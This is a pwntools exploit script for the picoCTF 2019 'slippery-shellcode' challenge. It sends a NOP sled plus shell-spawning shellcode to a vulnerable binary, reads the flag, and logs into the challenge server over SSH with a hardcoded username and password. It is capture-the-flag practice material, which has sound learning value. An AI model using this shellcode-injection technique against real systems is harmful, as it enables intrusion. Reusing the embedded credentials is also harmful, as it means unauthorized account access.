#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#=========================================================
#                   SETTING UP VARIABLES
#=========================================================

os ='linux'
arch ='i386'    
r_host = '2019shell1.picoctf.com'
r_dir = '/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1'
r_user = 'Intrinsic'
r_passwd = 'Kanoa2019'
# r_port = ''                                            
exe = './vuln'
script = 'b* main'
mode = ''
local = False
remote = False
debug = False
s = ''
io = ''
begin = ''
end = ''
data = ''

                  # Context variables # 

context.log_level = 'debug'
context.update(os=os, arch=arch)

#==========================================================
#                   FUNCTION DEFINITIONS
#==========================================================

# Attaches gdb to the running process if 'debug' is selected
def attach_gdb():
    global script
    global io

    gdb.attach(io, gdbscript=script)

# Checks output for the 'pico' flag and either prints it or 
# exits if no data is sent.
def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if not data:
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info(f"Pwned! Here's your flag: {data}")
    
    io.close()

# Prompts user for mode (local, remote, debug) and sets the
# corresponding variable to 'True' or exits if none.
def setup ():
    global mode
    global local
    global remote
    global debug

    mode = input('Start exploit in local, remote or debug mode? ')
    if str('remote') in mode:
        remote = True
    elif str('local') in mode:
        local = True
    elif str('debug') in mode:
        debug = True
    else:
        exit()

#
#
def start():
    global mode
    global begin
    global exe
    global io
    global s
    global script

    begin = time.time()

    if debug:
        io = process(exe)
        attach_gdb()
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  

def finish():
  global end
  global begin

  end = time.time()
  run_time = end - begin
  print(f'Time elapsed: {run_time:.2f}')

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
setup()

start()

padding = b'\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print(io.recv())

io.sendline(payload)

print(io.recv())

io.sendline(b'cat flag.txt')

get_flag()

finish()
#===========================================================
#                       END OF SCRIPT                      
#===========================================================

